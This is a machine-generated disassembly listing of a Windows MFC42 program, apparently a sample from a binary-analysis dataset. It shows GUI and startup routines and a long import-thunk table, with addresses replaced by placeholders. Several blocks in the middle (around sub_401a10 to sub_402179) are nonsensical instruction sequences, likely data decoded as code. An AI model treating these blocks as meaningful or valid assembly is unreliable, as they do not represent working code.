mov esi edx
call sub_4047c0
mov ecx [ eax + edi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ esi + 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
cmp ecx 0xa
jg rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
sub [ rwxdata ] 0x19
sub eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
add eax 0x19
add eax 0x19
mov [ rwxdata ] eax
sub eax 0x19
sub_4052e0
push ebp
mov ebp esp
sub esp 0x164
push ebx
push esi
mov [ ebp - 0x4 ] ecx
push edi
mov ecx 0x5
mov esi rwxdata
lea edi [ ebp - 0x24 ]
lea eax [ ebp - 0x164 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x24 ]
push eax
push ecx
movsw [ edi ] [ esi ]
call [ FindFirstFileA@IAT ]
lea edi [ ebp - 0x24 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne rwxdata
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x4 ]
push 0x1f1a
push rwxdata
mov [ ebp - 0xc ] edx
call sub_404d80
push 0x0
call [ exit@IAT ]
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov al [ esp + 0x4 ]
push esi
mov esi ecx
test al 0x1
mov [ esi ] rwxdata
je rwxdata
pushad
push eax
nop
nop
pop eax
popad
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4053a0
push 0xffffffff
push sub_4060d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405410
push 0xffffffff
push sub_4060f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405480
push 0xffffffff
push sub_406118
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4054f0
push 0xffffffff
push sub_406138
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405540
push 0xffffffff
push sub_40615a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x1e0
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_4055e0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4055e0
push 0xffffffff
push sub_406186
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_529
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_554
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405660
push 0xffffffff
push sub_4061a6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_807
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_796
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4056d0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
je rwxdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
push 0xe800
xor eax eax
sub esp 0x10
xor ecx ecx
mov ebp esp
xor edx edx
lea edi [ esi + 0x140 ]
push 0x50402834
mov [ ebp ] eax
xor ebx ebx
push 0x800
push esi
mov [ ebp + 0x4 ] ecx
mov ecx edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ebx
call Ordinal_MFC42_6625
test eax eax
je rwxdata
push 0x80
mov ecx edi
call Ordinal_MFC42_4163
test eax eax
je rwxdata
lea ebx [ esi + 0xc0 ]
push 0xe801
push 0x50008200
push esi
mov ecx ebx
call Ordinal_MFC42_2117
test eax eax
je rwxdata
push 0x4
push rwxdata
mov ecx ebx
call Ordinal_MFC42_6000
test eax eax
je rwxdata
push 0xf000
mov ecx edi
call Ordinal_MFC42_2626
push 0x0
mov ecx edi
call Ordinal_MFC42_6215
push 0x0
mov ecx ebx
call Ordinal_MFC42_6215
push 0xf000
mov ecx esi
call Ordinal_MFC42_2627
push 0x0
push 0x0
push edi
mov ecx esi
call Ordinal_MFC42_2494
push 0x0
mov ecx esi
call sub_405860
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_4057c0
push esi
mov esi [ esp + 0x8 ]
push esi
call Ordinal_MFC42_5252
test eax eax
jne rwxdata
mov al [ rwxdata ]
push edi
mov edi [ GetSystemMetrics@IAT ]
test al 0x1
jne rwxdata
pop esi
retn 0x4
mov cl [ rwxdata ]
mov al 0x2
test al cl
jne rwxdata
mov cl al
push 0x0
or cl 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
mov eax 0x55555556
pop edi
imul [ rwxdata ]
mov eax edx
shr eax 0x1f
add edx eax
mov eax 0x38e38e39
mov [ esi + 0x1c ] edx
mov ecx [ rwxdata ]
imul ecx
sar edx 0x1
mov ecx edx
mov [ esi + 0x14 ] 0x11f
shr ecx 0x1f
add edx ecx
mov [ esi + 0x10 ] 0x264
mov [ esi + 0x18 ] edx
mov eax 0x1
pop esi
retn 0x4
or cl al
push 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
sub_405860
mov eax [ rwxdata ]
push esi
test eax eax
mov esi ecx
jne rwxdata
mov cl [ esp + 0x8 ]
test cl cl
je rwxdata
test esi esi
je rwxdata
test esi esi
jne rwxdata
test esi esi
jne rwxdata
push eax
call [ GetMenu@IAT ]
mov [ rwxdata ] eax
mov eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
xor eax eax
jmp rwxdata
mov ecx [ esi + 0x20 ]
xor ecx ecx
jmp rwxdata
push 0x0
push eax
call [ SetMenu@IAT ]
push 0x20
push 0x0
push 0xc00000
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
push eax
push ecx
call [ SetMenu@IAT ]
push 0x20
push 0xc00000
push 0x0
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rwxdata ] 0xffffffff
or [ rwxdata ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rwxdata ] eax
call sub_405f4b
cmp [ rwxdata ] ebx
jne rwxdata
call sub_405f36
push rwxdata
push rwxdata
call _initterm
mov eax [ rwxdata ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rwxdata ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rwxdata
push rwxdata
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push sub_405f48
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_405f52
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_405f6a
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne rwxdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_40146a
mov dh 0x68
jmp sub_40148c
sub_401a0c
mov dh 0xb7
jmp sub_401a25
sub_401a10
push 0xeb701deb
lodsd [ esi ]
insb
shl [ edx ] cl
shl [ eax ] cl
0x6126e366 0x2adb
sub_401a25
nop
jecxz rwxdata
mov edi 0x6c2229be
pushad
mov ch 0xeb
mov ecx fs
arpl bx sp
and ah [ ecx - 0x75 ]
j_sub_401a58
jmp sub_401a58
sub_401a32
pushad
adc al 0x6f
0xe367e866 0x6126
sub_401c5c
imul esp [ ecx + 0x60 ] 0x6825e360
out 0x97 eax
jmp rwxdata
cwde
sar [ edi + 0x68a7e99c ] cl
jmp 0xffffffff982b88d6
sub_401d21
pushad
pushad
outsd
push esi
je rwxdata
jmp rwxdata
arpl [ esp + eax * 8 ] dx
int3
sub_401d47
pushad
pushad
outsd
push esi
mov ah 0x6b
popad
arpl [ esp + eax * 8 ] dx
int3
sub_401d54
insd
popad
pushad
pushad
jecxz rwxdata
jmp rwxdata
mov dh 0x64
jmp sub_401d3f
sub_401d5d
push 0x1c7e9be3
dec esp
shl [ eax ] cl
jmp rwxdata
jecxz rwxdata
push 0xeb7025e3
movsb [ edi ] [ esi ]
mov al [ 0xffffffffb7eb67eb ]
shl [ fs : ebp + 0x64b5d360 ] cl
jmp 0x64f706fc
sub_401d7c
insb
jmp rwxdata
mov dh 0x64
jmp sub_401d3f
sub_401dc2
imul esp [ ecx + 0x60 ] 0x6825e360
out 0x97 eax
jmp rwxdata
sub [ edx ] esp
insb
pushad
mov ch 0xeb
mov [ eax ] es
pushfd
jmp rwxdata
jmp rwxdata
lahf
sub_401e6b
push 0xe1700deb
and eax 0x606061a0
jmp rwxdata
xor [ eax ] esp
jmp 0x28af8793
sub_401ec0
imul esp [ ecx + 0x60 ] 0x688de360
out 0x97 eax
loopne rwxdata
jmp 0xffffffffbf298701
popad
adc eax 0xeb66eb3d
lodsd [ esi ]
pushfd
retn
sub_402160
mov dh 0xb1
jmp sub_402179
sub_402164
push 0x6831feeb
pushad
pushad
jmp rwxdata
rcl al 0x1
mov ch 0xeb
sub_40216d
xor eax 0xeb606068
hlt
sub_402179
in al 0xd3
cmp eax 0x21606068
and dh [ ebx + 0x21 ]
and [ ebx + 0x63 ] bh
hlt
sub_403ac0
mov edx ecx
push edi
mov ecx 0x8
xor eax eax
lea edi [ edx + 0x4 ]
mov [ edx ] rwxdata
[ edi ]
mov [ edx + 0x24 ] ax
mov eax edx
pop edi
retn
sub_403ae0
push esi
mov esi ecx
call sub_403b00
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403b00
mov [ ecx ] rwxdata
retn
sub_403b10
retn 0x10
sub_403f90
push edi
lea edi [ ecx + 0x4 ]
mov ecx 0x8
xor eax eax
[ edi ]
pop edi
retn
sub_403fa0
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_403fb0
mov eax rwxdata
retn
sub_403fc0
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_403fe0
push esi
mov esi ecx
call sub_404000
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404000
jmp Ordinal_MFC42_815
sub_404010
call sub_404020
jmp sub_404030
sub_404020
mov ecx rwxdata
jmp sub_403fc0
sub_404030
push sub_404040
call sub_405da4
pop ecx
retn
sub_404040
mov ecx rwxdata
jmp sub_404000
sub_4041a0
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_4041c0
push esi
mov esi ecx
call sub_4041e0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4041e0
jmp Ordinal_MFC42_641
sub_4041f0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_404200
mov eax rwxdata
retn
sub_404270
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_404280
retn
sub_404290
retn 0x4
sub_4042a0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_4042b0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_404320
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_404330
mov eax rwxdata
retn
sub_404340
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_404350
mov eax rwxdata
retn
sub_404360
push esi
mov esi ecx
call Ordinal_MFC42_338
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_404380
push esi
mov esi ecx
call sub_4043a0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4043a0
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_652
sub_4043b0
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_4043c0
retn 0x4
sub_4043d0
mov eax [ ecx + 0x48 ]
retn
sub_4043e0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_4043f0
jmp rwxdata
retn
sub_404410
call sub_404420
jmp sub_404450
sub_404420
mov ecx rwxdata
jmp sub_404430
sub_404430
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404450
push sub_404460
call sub_405da4
pop ecx
retn
sub_404460
mov ecx rwxdata
jmp j_sub_403b00
sub_404470
call sub_404480
jmp sub_4044c0
sub_404480
mov ecx rwxdata
jmp sub_404490
sub_404490
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x1
mov eax esi
pop esi
retn
j_sub_403b00
jmp sub_403b00
sub_4044c0
push sub_4044d0
call sub_405da4
pop ecx
retn
sub_4044d0
mov ecx rwxdata
jmp j_sub_403b00
sub_4044e0
call sub_4044f0
jmp sub_404520
sub_4044f0
mov ecx rwxdata
jmp sub_404500
sub_404500
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404520
push sub_404530
call sub_405da4
pop ecx
retn
sub_404530
mov ecx rwxdata
jmp j_sub_403b00
sub_404540
call sub_404550
jmp sub_404580
sub_404550
mov ecx rwxdata
jmp sub_404560
sub_404560
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_404580
push sub_404590
call sub_405da4
pop ecx
retn
sub_404590
mov ecx rwxdata
jmp j_sub_403b00
sub_4045a0
call sub_4045b0
jmp sub_4045e0
sub_4045b0
mov ecx rwxdata
jmp sub_4045c0
sub_4045c0
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_4045e0
push sub_4045f0
call sub_405da4
pop ecx
retn
sub_4045f0
mov ecx rwxdata
jmp j_sub_403b00
sub_404600
call sub_404610
jmp sub_404660
sub_404610
mov ecx rwxdata
jmp sub_404620
sub_404620
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x4
mov eax esi
pop esi
retn
sub_404640
push esi
mov esi ecx
call j_sub_403b00
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_404660
push sub_404670
call sub_405da4
pop ecx
retn
sub_404670
mov ecx rwxdata
jmp j_sub_403b00
sub_404680
call sub_404690
jmp sub_4046c0
sub_404690
mov ecx rwxdata
jmp sub_4046a0
sub_4046a0
push esi
mov esi ecx
call sub_403ac0
mov [ esi ] rwxdata
mov [ esi + 0x50 ] 0x2
mov eax esi
pop esi
retn
sub_4046c0
push sub_4046d0
call sub_405da4
pop ecx
retn
sub_4046d0
mov ecx rwxdata
jmp j_sub_403b00
sub_404740
mov eax [ Ordinal_MFC42_1945@IAT ]
retn
sub_404750
mov eax rwxdata
retn
sub_404760
mov eax [ Ordinal_MFC42_4273@IAT ]
retn
sub_404770
mov eax rwxdata
retn
sub_404880
push esi
mov esi ecx
call sub_4048a0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4048a0
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_813
sub_4048b0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5260
retn 0x4
sub_404d70
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
add ecx eax
test ecx ecx
setne al
retn
sub_404ea0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_2535
retn 0x4
sub_404eb0
retn 0x8
sub_4052cc
nop
nop
nop
nop
mov eax 0x1
retn 0x4
sub_405370
mov [ ecx ] rwxdata
retn
sub_405380
push esi
mov esi ecx
call sub_4053a0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4053f0
push esi
mov esi ecx
call sub_405410
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405460
push esi
mov esi ecx
call sub_405480
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4054d0
push esi
mov esi ecx
call sub_4054f0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4055a0
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_4055b0
mov eax rwxdata
retn
sub_4055c0
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_4055d0
mov eax rwxdata
retn
sub_405640
push esi
mov esi ecx
call sub_405660
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_4615
jmp [ Ordinal_MFC42_4615@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_4614
jmp [ Ordinal_MFC42_4614@IAT ]
Ordinal_MFC42_4613
jmp [ Ordinal_MFC42_4613@IAT ]
